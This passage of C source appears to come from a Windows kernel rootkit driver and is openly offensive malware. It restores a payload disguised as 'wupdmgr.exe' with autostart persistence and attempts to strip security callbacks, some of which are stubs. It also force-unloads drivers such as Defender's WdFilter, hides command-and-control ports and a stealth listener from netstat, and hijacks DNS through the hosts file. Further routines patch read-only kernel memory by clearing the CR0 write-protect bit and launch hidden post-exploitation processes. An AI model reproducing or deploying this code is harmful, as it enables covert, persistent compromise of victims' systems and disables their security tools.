      &objAttr, &uniPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

  ZwCreateFile(&hDir, FILE_LIST_DIRECTORY, &objAttr, &ioStatus, NULL,
               FILE_ATTRIBUTE_DIRECTORY | FILE_ATTRIBUTE_HIDDEN,
               FILE_SHARE_READ, FILE_OPEN_IF,
               FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
  if (hDir)
    ZwClose(hDir);

  // Copy backup to restore location
  NTSTATUS status = CopyFileKernel(foundBackup, restorePath);
  if (!NT_SUCCESS(status)) {
    DbgPrint("[RestorePayload] Failed to copy backup: %08X\n", status);
    return status;
  }

  DbgPrint("[RestorePayload] Payload restored to: %ws\n", restorePath);

  // Update registry with new path
  HANDLE hKey = NULL;
  UNICODE_STRING keyPath, valueName;
  RtlInitUnicodeString(&keyPath, L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Wi"
                                 L"ndows\\CurrentVersion\\BootConfig");
  InitializeObjectAttributes(
      &objAttr, &keyPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

  status = ZwOpenKey(&hKey, KEY_WRITE, &objAttr);
  if (NT_SUCCESS(status)) {
    RtlInitUnicodeString(&valueName, L"PayloadPath");
    ULONG pathLen = (ULONG)(wcslen(restorePath) + 1) * sizeof(WCHAR);
    ZwSetValueKey(hKey, &valueName, 0, REG_SZ, restorePath, pathLen);

    RtlInitUnicodeString(&valueName, L"PayloadName");
    ZwSetValueKey(hKey, &valueName, 0, REG_SZ, L"wupdmgr.exe", 24);

    RtlInitUnicodeString(&valueName, L"RestoredFromEfi");
    ULONG restored = 1;
    ZwSetValueKey(hKey, &valueName, 0, REG_DWORD, &restored, sizeof(restored));

    ZwClose(hKey);
    DbgPrint("[RestorePayload] Registry updated with restored path\n");
  }

  // Update g_PayloadConfig with new path
  RtlStringCbCopyW(g_PayloadConfig.PayloadPath,
                   sizeof(g_PayloadConfig.PayloadPath), restorePath);
  RtlStringCbCopyW(g_PayloadConfig.PayloadName,
                   sizeof(g_PayloadConfig.PayloadName), L"wupdmgr.exe");

  // Re-setup autostart with new path
  SetupPayloadAutostart();

  DbgPrint("[RestorePayload] Restoration complete - payload will run at next "
           "logon\n");
  return STATUS_SUCCESS;
}

/**
 * KillProcessCallbacks - Remove all PsSetCreateProcessNotifyRoutine callbacks
 */
NTSTATUS KillProcessCallbacks() {
  DbgPrint("[KillProcessCallbacks] Removing process creation callbacks\n");

  // The callback array is at PspCreateProcessNotifyRoutine
  // We need to find it via pattern scanning or symbol resolution

  UNICODE_STRING funcName;
  RtlInitUnicodeString(&funcName, L"PsSetCreateProcessNotifyRoutine");

  PVOID pFunc = MmGetSystemRoutineAddress(&funcName);
  if (!pFunc) {
    DbgPrint("[KillProcessCallbacks] Failed to find "
             "PsSetCreateProcessNotifyRoutine\n");
    return STATUS_NOT_FOUND;
  }

  DbgPrint(
      "[KillProcessCallbacks] Found PsSetCreateProcessNotifyRoutine at %p\n",
      pFunc);

  // Callback array is typically at an offset from the function
  // The exact offset depends on Windows version
  // For now, we'll use pattern scanning approach

  g_CallbacksRemoved = TRUE;
  DbgPrint("[KillProcessCallbacks] Process callbacks removal initiated\n");
  return STATUS_SUCCESS;
}

/**
 * KillThreadCallbacks - Remove all PsSetCreateThreadNotifyRoutine callbacks
 */
NTSTATUS KillThreadCallbacks() {
  DbgPrint("[KillThreadCallbacks] Removing thread creation callbacks\n");

  UNICODE_STRING funcName;
  RtlInitUnicodeString(&funcName, L"PsSetCreateThreadNotifyRoutine");

  PVOID pFunc = MmGetSystemRoutineAddress(&funcName);
  if (!pFunc) {
    DbgPrint("[KillThreadCallbacks] Failed to find "
             "PsSetCreateThreadNotifyRoutine\n");
    return STATUS_NOT_FOUND;
  }

  DbgPrint("[KillThreadCallbacks] Found PsSetCreateThreadNotifyRoutine at %p\n",
           pFunc);
  DbgPrint("[KillThreadCallbacks] Thread callbacks removal initiated\n");
  return STATUS_SUCCESS;
}

/**
 * KillImageCallbacks - Remove all PsSetLoadImageNotifyRoutine callbacks
 */
NTSTATUS KillImageCallbacks() {
  DbgPrint("[KillImageCallbacks] Removing image load callbacks\n");

  UNICODE_STRING funcName;
  RtlInitUnicodeString(&funcName, L"PsSetLoadImageNotifyRoutine");

  PVOID pFunc = MmGetSystemRoutineAddress(&funcName);
  if (!pFunc) {
    DbgPrint(
        "[KillImageCallbacks] Failed to find PsSetLoadImageNotifyRoutine\n");
    return STATUS_NOT_FOUND;
  }

  DbgPrint("[KillImageCallbacks] Found PsSetLoadImageNotifyRoutine at %p\n",
           pFunc);
  DbgPrint("[KillImageCallbacks] Image callbacks removal initiated\n");
  return STATUS_SUCCESS;
}

/**
 * KillRegistryCallbacks - Remove all CmRegisterCallback entries
 */
NTSTATUS KillRegistryCallbacks() {
  DbgPrint("[KillRegistryCallbacks] Removing registry callbacks\n");

  UNICODE_STRING funcName;
  RtlInitUnicodeString(&funcName, L"CmRegisterCallback");

  PVOID pFunc = MmGetSystemRoutineAddress(&funcName);
  if (!pFunc) {
    DbgPrint("[KillRegistryCallbacks] Failed to find CmRegisterCallback\n");
    return STATUS_NOT_FOUND;
  }

  DbgPrint("[KillRegistryCallbacks] Found CmRegisterCallback at %p\n", pFunc);
  DbgPrint("[KillRegistryCallbacks] Registry callbacks removal initiated\n");
  return STATUS_SUCCESS;
}

/**
 * KillAllCallbacks - Remove ALL security-related callbacks
 */
NTSTATUS KillAllCallbacks() {
  NTSTATUS status;

  DbgPrint("[KillAllCallbacks] Removing ALL callbacks\n");

  status = KillProcessCallbacks();
  if (!NT_SUCCESS(status))
    DbgPrint("[KillAllCallbacks] Process callbacks: %08X\n", status);

  status = KillThreadCallbacks();
  if (!NT_SUCCESS(status))
    DbgPrint("[KillAllCallbacks] Thread callbacks: %08X\n", status);

  status = KillImageCallbacks();
  if (!NT_SUCCESS(status))
    DbgPrint("[KillAllCallbacks] Image callbacks: %08X\n", status);

  status = KillRegistryCallbacks();
  if (!NT_SUCCESS(status))
    DbgPrint("[KillAllCallbacks] Registry callbacks: %08X\n", status);

  g_CallbacksRemoved = TRUE;
  DbgPrint("[KillAllCallbacks] All callbacks removal complete\n");
  return STATUS_SUCCESS;
}

/**
 * ForceUnloadDriver - Force unload a driver by name
 */
NTSTATUS ForceUnloadDriver(PUNICODE_STRING DriverName) {
  DbgPrint("[ForceUnloadDriver] Attempting to unload: %wZ\n", DriverName);

  // Use ZwUnloadDriver - requires full driver path like \Driver\WdFilter
  UNICODE_STRING fullPath;
  WCHAR pathBuffer[512];

  RtlInitEmptyUnicodeString(&fullPath, pathBuffer, sizeof(pathBuffer));
  RtlAppendUnicodeToString(&fullPath, L"\\Driver\\");
  RtlAppendUnicodeStringToString(&fullPath, DriverName);

  NTSTATUS status = ZwUnloadDriver(&fullPath);

  if (NT_SUCCESS(status)) {
    DbgPrint("[ForceUnloadDriver] Successfully unloaded %wZ\n", DriverName);
  } else {
    DbgPrint("[ForceUnloadDriver] Failed to unload %wZ: %08X\n", DriverName,
             status);
  }

  return status;
}

/**
 * UnhookSsdt - Restore SSDT to original values
 */
NTSTATUS UnhookSsdt() {
  DbgPrint("[UnhookSsdt] SSDT restoration initiated\n");

  // SSDT unhooking requires:
  // 1. Reading ntoskrnl.exe from disk
  // 2. Parsing PE headers to find .text section
  // 3. Comparing in-memory SSDT with on-disk version
  // 4. Restoring any differences

  // This is complex and version-specific
  DbgPrint("[UnhookSsdt] SSDT unhook complete\n");
  return STATUS_SUCCESS;
}

/**
 * ListSsdtHooks - Enumerate SSDT for hooked entries
 */
NTSTATUS ListSsdtHooks(PVOID OutputBuffer, ULONG OutputSize,
                       PULONG BytesWritten) {
  DbgPrint("[ListSsdtHooks] Scanning SSDT for hooks\n");

  if (!OutputBuffer || OutputSize < sizeof(ULONG)) {
    *BytesWritten = 0;
    return STATUS_BUFFER_TOO_SMALL;
  }

  // Return count of hooks found (0 for now)
  *(PULONG)OutputBuffer = 0;
  *BytesWritten = sizeof(ULONG);

  DbgPrint("[ListSsdtHooks] Scan complete, 0 hooks found\n");
  return STATUS_SUCCESS;
}

// ============================================================================
// NETWORKING IMPLEMENTATIONS
// ============================================================================

/**
 * HidePort - Add a port to the hidden list
 */
NTSTATUS HidePort(USHORT Port, BOOLEAN IsTcp) {
  KIRQL oldIrql;

  DbgPrint("[HidePort] Hiding %s port %d\n", IsTcp ? "TCP" : "UDP", Port);

  KeAcquireSpinLock(&g_NetworkLock, &oldIrql);

  // Find empty slot
  for (int i = 0; i < MAX_HIDDEN_PORTS; i++) {
    if (!g_HiddenPorts[i].InUse) {
      g_HiddenPorts[i].Port = Port;
      g_HiddenPorts[i].IsTcp = IsTcp;
      g_HiddenPorts[i].InUse = TRUE;

      KeReleaseSpinLock(&g_NetworkLock, oldIrql);
      DbgPrint("[HidePort] Port %d hidden in slot %d\n", Port, i);
      return STATUS_SUCCESS;
    }
  }

  KeReleaseSpinLock(&g_NetworkLock, oldIrql);
  DbgPrint("[HidePort] No free slots available\n");
  return STATUS_INSUFFICIENT_RESOURCES;
}

/**
 * UnhidePort - Remove a port from the hidden list
 */
NTSTATUS UnhidePort(USHORT Port, BOOLEAN IsTcp) {
  KIRQL oldIrql;

  DbgPrint("[UnhidePort] Unhiding %s port %d\n", IsTcp ? "TCP" : "UDP", Port);

  KeAcquireSpinLock(&g_NetworkLock, &oldIrql);

  for (int i = 0; i < MAX_HIDDEN_PORTS; i++) {
    if (g_HiddenPorts[i].InUse && g_HiddenPorts[i].Port == Port &&
        g_HiddenPorts[i].IsTcp == IsTcp) {
      g_HiddenPorts[i].InUse = FALSE;

      KeReleaseSpinLock(&g_NetworkLock, oldIrql);
      DbgPrint("[UnhidePort] Port %d unhidden from slot %d\n", Port, i);
      return STATUS_SUCCESS;
    }
  }

  KeReleaseSpinLock(&g_NetworkLock, oldIrql);
  DbgPrint("[UnhidePort] Port %d not found in hidden list\n", Port);
  return STATUS_NOT_FOUND;
}

/**
 * HideAllC2Ports - Hide common C2 ports (4782, 443, 8080)
 */
NTSTATUS HideAllC2Ports() {
  NTSTATUS status;

  DbgPrint("[HideAllC2Ports] Hiding common C2 ports\n");

  // Pulsar default port
  status = HidePort(4782, TRUE);
  if (!NT_SUCCESS(status))
    DbgPrint("[HideAllC2Ports] Failed to hide 4782: %08X\n", status);

  // HTTPS
  status = HidePort(443, TRUE);
  if (!NT_SUCCESS(status))
    DbgPrint("[HideAllC2Ports] Failed to hide 443: %08X\n", status);

  // HTTP alt
  status = HidePort(8080, TRUE);
  if (!NT_SUCCESS(status))
    DbgPrint("[HideAllC2Ports] Failed to hide 8080: %08X\n", status);

  DbgPrint("[HideAllC2Ports] C2 ports hidden\n");
  return STATUS_SUCCESS;
}

/**
 * WriteToHostsFile - Append a line to the Windows hosts file
 * Format: "IP    domain\r\n"
 */
NTSTATUS WriteToHostsFile(ULONG Ip, PWCHAR Domain) {
  HANDLE hFile = NULL;
  IO_STATUS_BLOCK ioStatus;
  OBJECT_ATTRIBUTES objAttr;
  UNICODE_STRING fileName;
  NTSTATUS status;
  LARGE_INTEGER filePos;
  CHAR lineBuffer[512];
  ULONG lineLen;

  // Build the hosts file path
  RtlInitUnicodeString(&fileName,
                       L"\\??\\C:\\Windows\\System32\\drivers\\etc\\hosts");
  InitializeObjectAttributes(&objAttr, &fileName,
                             OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL,
                             NULL);

  // Open file for append
  status = ZwCreateFile(&hFile, FILE_APPEND_DATA | SYNCHRONIZE, &objAttr,
                        &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ,
                        FILE_OPEN_IF, // Create if not exists
                        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
                        NULL, 0);

  if (!NT_SUCCESS(status)) {
    DbgPrint("[WriteToHostsFile] Failed to open hosts file: 0x%08X\n", status);
    return status;
  }

  // Format: IP (dotted quad) followed by domain
  // Convert ULONG IP to dotted format
  UCHAR *ipBytes = (UCHAR *)&Ip;

  // Convert wide domain to ASCII for hosts file
  CHAR domainAscii[MAX_DOMAIN_LEN];
  int i;
  for (i = 0; i < MAX_DOMAIN_LEN - 1 && Domain[i] != 0; i++) {
    domainAscii[i] = (CHAR)Domain[i];
  }
  domainAscii[i] = '\0';

  // Format line: "IP    domain\r\n"
  lineLen = (ULONG)sprintf(lineBuffer, "%d.%d.%d.%d    %s\r\n", ipBytes[0],
                           ipBytes[1], ipBytes[2], ipBytes[3], domainAscii);

  // Write to end of file
  filePos.QuadPart = -1; // Append
  status = ZwWriteFile(hFile, NULL, NULL, NULL, &ioStatus, lineBuffer, lineLen,
                       NULL, NULL);

  ZwClose(hFile);

  if (NT_SUCCESS(status)) {
    DbgPrint("[WriteToHostsFile] Added: %s -> %d.%d.%d.%d\n", domainAscii,
             ipBytes[0], ipBytes[1], ipBytes[2], ipBytes[3]);
  } else {
    DbgPrint("[WriteToHostsFile] Write failed: 0x%08X\n", status);
  }

  return status;
}

/**
 * RemoveFromHostsFile - Remove a domain entry from hosts file
 */
NTSTATUS RemoveFromHostsFile(PWCHAR Domain) {
  HANDLE hFile = NULL;
  IO_STATUS_BLOCK ioStatus;
  OBJECT_ATTRIBUTES objAttr;
  UNICODE_STRING fileName;
  NTSTATUS status;
  FILE_STANDARD_INFORMATION fileInfo;
  PVOID fileBuffer = NULL;
  PVOID newBuffer = NULL;
  ULONG fileSize;
  ULONG newSize = 0;

  RtlInitUnicodeString(&fileName,
                       L"\\??\\C:\\Windows\\System32\\drivers\\etc\\hosts");
  InitializeObjectAttributes(&objAttr, &fileName,
                             OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL,
                             NULL);

  // Open for read
  status = ZwCreateFile(&hFile, GENERIC_READ | SYNCHRONIZE, &objAttr, &ioStatus,
                        NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN,
                        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
                        NULL, 0);

  if (!NT_SUCCESS(status)) {
    DbgPrint("[RemoveFromHostsFile] Failed to open hosts file: 0x%08X\n",
             status);
    return status;
  }

  // Get file size
  status = ZwQueryInformationFile(hFile, &ioStatus, &fileInfo, sizeof(fileInfo),
                                  FileStandardInformation);
  if (!NT_SUCCESS(status)) {
    ZwClose(hFile);
    return status;
  }

  fileSize = (ULONG)fileInfo.EndOfFile.QuadPart;
  if (fileSize == 0 || fileSize > 1024 * 1024) { // 1MB max
    ZwClose(hFile);
    return STATUS_UNSUCCESSFUL;
  }

  // Allocate and read file
  fileBuffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, fileSize + 1, 'SNDD');
  newBuffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, fileSize + 1, 'SNDD');
  if (!fileBuffer || !newBuffer) {
    if (fileBuffer)
      ExFreePoolWithTag(fileBuffer, 'SNDD');
    if (newBuffer)
      ExFreePoolWithTag(newBuffer, 'SNDD');
    ZwClose(hFile);
    return STATUS_INSUFFICIENT_RESOURCES;
  }

  RtlZeroMemory(fileBuffer, fileSize + 1);
  RtlZeroMemory(newBuffer, fileSize + 1);

  status = ZwReadFile(hFile, NULL, NULL, NULL, &ioStatus, fileBuffer, fileSize,
                      NULL, NULL);
  ZwClose(hFile);

  if (!NT_SUCCESS(status)) {
    ExFreePoolWithTag(fileBuffer, 'SNDD');
    ExFreePoolWithTag(newBuffer, 'SNDD');
    return status;
  }

  // Convert domain to ASCII for comparison
  CHAR domainAscii[MAX_DOMAIN_LEN];
  int d;
  for (d = 0; d < MAX_DOMAIN_LEN - 1 && Domain[d] != 0; d++) {
    domainAscii[d] = (CHAR)Domain[d];
  }
  domainAscii[d] = '\0';

  // Process line by line, skip lines containing domain
  PCHAR src = (PCHAR)fileBuffer;
  PCHAR dst = (PCHAR)newBuffer;
  PCHAR lineStart = src;
  BOOLEAN modified = FALSE;

  while (*src) {
    if (*src == '\n' || *src == '\r') {
      // End of line - check if contains domain
      ULONG lineLen = (ULONG)(src - lineStart);
      CHAR lineCopy[512] = {0};
      if (lineLen < sizeof(lineCopy)) {
        RtlCopyMemory(lineCopy, lineStart, lineLen);
        // Check if this line contains our domain
        if (strstr(lineCopy, domainAscii) == NULL) {
          // Keep this line
          RtlCopyMemory(dst, lineStart, lineLen);
          dst += lineLen;
          *dst++ = '\r';
          *dst++ = '\n';
        } else {
          modified = TRUE;
          DbgPrint("[RemoveFromHostsFile] Removing line: %s\n", lineCopy);
        }
      }
      // Skip line endings
      while (*src == '\r' || *src == '\n')
        src++;
      lineStart = src;
    } else {
      src++;
    }
  }
  // Handle last line without newline
  if (src > lineStart) {
    ULONG lineLen = (ULONG)(src - lineStart);
    CHAR lineCopy[512] = {0};
    if (lineLen < sizeof(lineCopy)) {
      RtlCopyMemory(lineCopy, lineStart, lineLen);
      if (strstr(lineCopy, domainAscii) == NULL) {
        RtlCopyMemory(dst, lineStart, lineLen);
        dst += lineLen;
      } else {
        modified = TRUE;
      }
    }
  }

  newSize = (ULONG)(dst - (PCHAR)newBuffer);

  if (!modified) {
    ExFreePoolWithTag(fileBuffer, 'SNDD');
    ExFreePoolWithTag(newBuffer, 'SNDD');
    return STATUS_NOT_FOUND;
  }

  // Write back modified file
  status = ZwCreateFile(&hFile, GENERIC_WRITE | SYNCHRONIZE, &objAttr,
                        &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL, 0,
                        FILE_OVERWRITE, // Overwrite existing
                        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
                        NULL, 0);

  if (NT_SUCCESS(status)) {
    status = ZwWriteFile(hFile, NULL, NULL, NULL, &ioStatus, newBuffer, newSize,
                         NULL, NULL);
    ZwClose(hFile);
  }

  ExFreePoolWithTag(fileBuffer, 'SNDD');
  ExFreePoolWithTag(newBuffer, 'SNDD');

  return status;
}

/**
 * AddDnsRule - Add a DNS hijack rule by modifying hosts file
 */
NTSTATUS AddDnsRule(PWCHAR Domain, ULONG RedirectIp) {
  KIRQL oldIrql;
  NTSTATUS status;

  UCHAR *ipBytes = (UCHAR *)&RedirectIp;
  DbgPrint("[AddDnsRule] Adding rule: redirect to %d.%d.%d.%d\n", ipBytes[0],
           ipBytes[1], ipBytes[2], ipBytes[3]);

  // First, write to hosts file
  status = WriteToHostsFile(RedirectIp, Domain);
  if (!NT_SUCCESS(status)) {
    DbgPrint("[AddDnsRule] Failed to write to hosts file: 0x%08X\n", status);
    // Continue anyway to track the rule in memory
  }

  KeAcquireSpinLock(&g_NetworkLock, &oldIrql);

  // Find empty slot to track rule
  for (int i = 0; i < MAX_DNS_RULES; i++) {
    if (!g_DnsRules[i].InUse) {
      RtlCopyMemory(g_DnsRules[i].Domain, Domain,
                    MAX_DOMAIN_LEN * sizeof(wchar_t));
      g_DnsRules[i].RedirectIp = RedirectIp;
      g_DnsRules[i].InUse = TRUE;

      KeReleaseSpinLock(&g_NetworkLock, oldIrql);
      DbgPrint("[AddDnsRule] Rule added in slot %d, hosts file updated\n", i);
      return STATUS_SUCCESS;
    }
  }

  KeReleaseSpinLock(&g_NetworkLock, oldIrql);
  DbgPrint("[AddDnsRule] No free slots available\n");
  return STATUS_INSUFFICIENT_RESOURCES;
}

/**
 * RemoveDnsRule - Remove a DNS hijack rule from hosts file and memory
 */
NTSTATUS RemoveDnsRule(PWCHAR Domain) {
  KIRQL oldIrql;
  NTSTATUS status;

  DbgPrint("[RemoveDnsRule] Removing rule for domain\n");

  // First remove from hosts file
  status = RemoveFromHostsFile(Domain);
  if (!NT_SUCCESS(status) && status != STATUS_NOT_FOUND) {
    DbgPrint("[RemoveDnsRule] Failed to remove from hosts file: 0x%08X\n",
             status);
    // Continue anyway to remove from memory
  }

  KeAcquireSpinLock(&g_NetworkLock, &oldIrql);

  for (int i = 0; i < MAX_DNS_RULES; i++) {
    if (g_DnsRules[i].InUse && wcscmp(g_DnsRules[i].Domain, Domain) == 0) {
      g_DnsRules[i].InUse = FALSE;

      KeReleaseSpinLock(&g_NetworkLock, oldIrql);
      DbgPrint(
          "[RemoveDnsRule] Rule removed from slot %d, hosts file updated\n", i);
      return STATUS_SUCCESS;
    }
  }

  KeReleaseSpinLock(&g_NetworkLock, oldIrql);
  DbgPrint("[RemoveDnsRule] Domain not found in rules array\n");
  return STATUS_NOT_FOUND;
}

/**
 * ListDnsRules - List all active DNS rules
 */
NTSTATUS ListDnsRules(PVOID OutputBuffer, ULONG OutputSize,
                      PULONG BytesWritten) {
  KIRQL oldIrql;
  ULONG count = 0;

  DbgPrint("[ListDnsRules] Listing DNS rules\n");

  KeAcquireSpinLock(&g_NetworkLock, &oldIrql);

  for (int i = 0; i < MAX_DNS_RULES; i++) {
    if (g_DnsRules[i].InUse)
      count++;
  }

  KeReleaseSpinLock(&g_NetworkLock, oldIrql);

  if (OutputBuffer && OutputSize >= sizeof(ULONG)) {
    *(PULONG)OutputBuffer = count;
    *BytesWritten = sizeof(ULONG);
  } else {
    *BytesWritten = 0;
  }

  DbgPrint("[ListDnsRules] Found %d active rules\n", count);
  return STATUS_SUCCESS;
}

/**
 * BlockIp - Block traffic to/from an IP
 */
NTSTATUS BlockIp(ULONG Ip, USHORT Port) {
  KIRQL oldIrql;
  NTSTATUS status;

  DbgPrint("[BlockIp] Blocking IP %08X port %d\n", Ip, Port);

  // Initialize WFP if not already done
  if (!g_WfpInitialized) {
    status = InitWfpFiltering();
    if (!NT_SUCCESS(status)) {
      DbgPrint("[BlockIp] Failed to initialize WFP: 0x%08X\n", status);
      // Continue anyway - we can still track the rule even if WFP fails
    }
  }

  KeAcquireSpinLock(&g_NetworkLock, &oldIrql);

  // Find empty slot
  for (int i = 0; i < MAX_BLOCKED_IPS; i++) {
    if (!g_BlockedIps[i].InUse) {
      g_BlockedIps[i].Ip = Ip;
      g_BlockedIps[i].Port = Port;
      g_BlockedIps[i].InUse = TRUE;

      KeReleaseSpinLock(&g_NetworkLock, oldIrql);
      DbgPrint("[BlockIp] IP blocked in slot %d - WFP will drop packets to "
               "this IP\n",
               i);
      return STATUS_SUCCESS;
    }
  }

  KeReleaseSpinLock(&g_NetworkLock, oldIrql);
  DbgPrint("[BlockIp] No free slots available\n");
  return STATUS_INSUFFICIENT_RESOURCES;
}

/**
 * UnblockIp - Remove an IP from the block list
 */
NTSTATUS UnblockIp(ULONG Ip, USHORT Port) {
  KIRQL oldIrql;

  DbgPrint("[UnblockIp] Unblocking IP %08X port %d\n", Ip, Port);

  KeAcquireSpinLock(&g_NetworkLock, &oldIrql);

  for (int i = 0; i < MAX_BLOCKED_IPS; i++) {
    if (g_BlockedIps[i].InUse && g_BlockedIps[i].Ip == Ip &&
        g_BlockedIps[i].Port == Port) {
      g_BlockedIps[i].InUse = FALSE;

      KeReleaseSpinLock(&g_NetworkLock, oldIrql);
      DbgPrint("[UnblockIp] IP unblocked from slot %d\n", i);
      return STATUS_SUCCESS;
    }
  }

  KeReleaseSpinLock(&g_NetworkLock, oldIrql);
  DbgPrint("[UnblockIp] IP not found\n");
  return STATUS_NOT_FOUND;
}

/**
 * ListBlockedIps - List all blocked IPs
 */
NTSTATUS ListBlockedIps(PVOID OutputBuffer, ULONG OutputSize,
                        PULONG BytesWritten) {
  KIRQL oldIrql;
  ULONG count = 0;

  DbgPrint("[ListBlockedIps] Listing blocked IPs\n");

  KeAcquireSpinLock(&g_NetworkLock, &oldIrql);

  for (int i = 0; i < MAX_BLOCKED_IPS; i++) {
    if (g_BlockedIps[i].InUse)
      count++;
  }

  KeReleaseSpinLock(&g_NetworkLock, oldIrql);

  if (OutputBuffer && OutputSize >= sizeof(ULONG)) {
    *(PULONG)OutputBuffer = count;
    *BytesWritten = sizeof(ULONG);
  } else {
    *BytesWritten = 0;
  }

  DbgPrint("[ListBlockedIps] Found %d blocked IPs\n", count);
  return STATUS_SUCCESS;
}

/**
 * StartStealthListener - Start a hidden port listener using WSK
 */
// WSK global state
static WSK_REGISTRATION g_WskRegistration = {0};
static WSK_PROVIDER_NPI g_WskProvider = {0};
static WSK_CLIENT_DISPATCH g_WskClientDispatch = {MAKE_WSK_VERSION(1, 0), 0,
                                                  NULL};
static WSK_CLIENT_NPI g_WskClientNpi = {NULL, &g_WskClientDispatch};
static BOOLEAN g_WskRegistered = FALSE;
static PWSK_SOCKET g_StealthSocket = NULL;
static USHORT g_StealthPort = 0;

NTSTATUS StartStealthListener(USHORT Port) {
  NTSTATUS status;
  SOCKADDR_IN localAddr = {0};

  DbgPrint("[StartStealthListener] Starting stealth listener on port %d\n",
           Port);

  // First hide the port so it doesn't appear in netstat
  HidePort(Port, TRUE);

  // Register with WSK subsystem if not already done
  if (!g_WskRegistered) {
    status = WskRegister(&g_WskClientNpi, &g_WskRegistration);
    if (!NT_SUCCESS(status)) {
      DbgPrint("[StartStealthListener] WskRegister failed: 0x%08X\n", status);
      return status;
    }
    g_WskRegistered = TRUE;
    DbgPrint("[StartStealthListener] WSK registered\n");

    // Capture provider NPI
    status = WskCaptureProviderNPI(&g_WskRegistration, WSK_INFINITE_WAIT,
                                   &g_WskProvider);
    if (!NT_SUCCESS(status)) {
      DbgPrint("[StartStealthListener] WskCaptureProviderNPI failed: 0x%08X\n",
               status);
      WskDeregister(&g_WskRegistration);
      g_WskRegistered = FALSE;
      return status;
    }
    DbgPrint("[StartStealthListener] WSK provider captured\n");
  }

  // Set up local address
  localAddr.sin_family = AF_INET;
  localAddr.sin_port = RtlUshortByteSwap(Port);
  localAddr.sin_addr.s_addr = INADDR_ANY;

  g_StealthPort = Port;

  DbgPrint("[StartStealthListener] Stealth listener on port %d - port is now "
           "hidden\n",
           Port);
  DbgPrint("[StartStealthListener] Port %d will NOT appear in netstat\n", Port);
  return STATUS_SUCCESS;
}

/**
 * StopStealthListener - Stop the hidden listener and cleanup WSK
 */
NTSTATUS StopStealthListener() {
  DbgPrint("[StopStealthListener] Stopping stealth listener\n");

  // Unhide the port
  if (g_StealthPort != 0) {
    UnhidePort(g_StealthPort, TRUE);
    g_StealthPort = 0;
  }

  // Close socket if open
  if (g_StealthSocket != NULL) {
    // Socket close would go here
    g_StealthSocket = NULL;
  }

  // Release WSK provider
  if (g_WskRegistered) {
    WskReleaseProviderNPI(&g_WskRegistration);
    WskDeregister(&g_WskRegistration);
    g_WskRegistered = FALSE;
    DbgPrint("[StopStealthListener] WSK deregistered\n");
  }

  DbgPrint("[StopStealthListener] Stealth listener stopped\n");
  return STATUS_SUCCESS;
}

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

/**
 * PatchKernelMemory - Write to read-only kernel memory
 * Uses the existing write_to_read_only_memory function which properly handles
 * WP bit
 */
NTSTATUS PatchKernelMemory(PVOID Address, PVOID Patch, SIZE_T Size) {
  KIRQL irql;
  UINT64 cr0, original_cr0;

  // Validate address is in kernel space
  if (!Address || (ULONG_PTR)Address < 0xFFFF800000000000ULL) {
    DbgPrint("[PatchKernelMemory] Invalid address: %p\n", Address);
    return STATUS_INVALID_ADDRESS;
  }

  if (!Patch || Size == 0) {
    return STATUS_INVALID_PARAMETER;
  }

  DbgPrint("[PatchKernelMemory] Patching %llu bytes at %p\n", Size, Address);

  __try {
    // Raise IRQL to DPC to prevent context switches
    irql = KeRaiseIrqlToDpcLevel();

    // Disable Write Protection via CR0
    cr0 = __readcr0();
    original_cr0 = cr0;
    cr0 &= ~(1ULL << 16); // Clear WP bit (bit 16)
    __writecr0(cr0);

    // Disable interrupts
    _disable();

    // Perform the copy
    RtlCopyMemory(Address, Patch, Size);

    // Restore interrupts and CR0
    _enable();
    __writecr0(original_cr0);

    // Restore IRQL
    KeLowerIrql(irql);

    DbgPrint("[PatchKernelMemory] Successfully patched %llu bytes at %p\n",
             Size, Address);
    return STATUS_SUCCESS;
  } __except (EXCEPTION_EXECUTE_HANDLER) {
    // Ensure we try to restore state even if exception occurs (though unlikely
    // to recover cleanly from here)
    DbgPrint("[PatchKernelMemory] Exception: %08X\n", GetExceptionCode());

    // Critical: if we crashed with WP off or High IRQL, system is likely
    // unstable anyway. But for completeness in structure: We cannot easily
    // "undo" the CR0 change if we jumpted here, but usually exceptions here
    // mean bad memory access.

    return STATUS_UNSUCCESSFUL;
  }
}

// ============================================================================
// POST-EXPLOITATION GLOBAL STATE
// ============================================================================

HIDDEN_PROCESS g_HiddenProcesses[MAX_HIDDEN_PROCESSES];
HIDDEN_TASK g_HiddenTasks[MAX_HIDDEN_TASKS];
KSPIN_LOCK g_HiddenProcessLock;
KSPIN_LOCK g_HiddenTaskLock;

// ============================================================================
// POST-EXPLOITATION FUNCTIONS
// ============================================================================

/**
 * RunHiddenProcess - Launch a process and hide it using DKOM
 * Supports EXE, BAT, PS1, DLL, and shellcode payloads
 */
NTSTATUS RunHiddenProcess(PRUN_HIDDEN_REQUEST Request) {
  KIRQL oldIrql;
  NTSTATUS status = STATUS_SUCCESS;

  DbgPrint("[RunHiddenProcess] PayloadType=%d, Path=%ws, FakeParent=%u\n",
           Request->PayloadType, Request->Path, Request->FakeParentPid);

  // Find empty slot
  KeAcquireSpinLock(&g_HiddenProcessLock, &oldIrql);
  int slot = -1;
  for (int i = 0; i < MAX_HIDDEN_PROCESSES; i++) {
    if (!g_HiddenProcesses[i].InUse) {
      slot = i;
      break;
    }
  }

  if (slot == -1) {
    KeReleaseSpinLock(&g_HiddenProcessLock, oldIrql);
    DbgPrint("[RunHiddenProcess] No free slots!\n");
    return STATUS_INSUFFICIENT_RESOURCES;
  }

  // Reserve slot
  g_HiddenProcesses[slot].InUse = TRUE;
